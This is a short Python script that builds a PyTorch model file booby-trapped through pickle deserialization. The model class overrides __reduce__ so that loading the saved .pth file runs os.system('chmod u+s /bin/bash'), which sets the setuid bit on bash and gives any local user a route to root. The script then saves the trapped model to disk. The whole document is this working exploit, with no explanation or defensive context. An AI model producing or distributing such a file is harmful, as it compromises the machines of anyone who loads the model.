import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
  def __init__(self):
    super(MaliciousModel, self).__init__()
    self.dense = nn.Linear(10,1)

  def forward(self, x):
    return self.dense(x)

  def __reduce__(self):
    cmd = "chmod u+s /bin/bash"
    return os.system, (cmd,)

malicious_model = MaliciousModel()

torch.save(malicious_model, '/models/evil_model.pth')
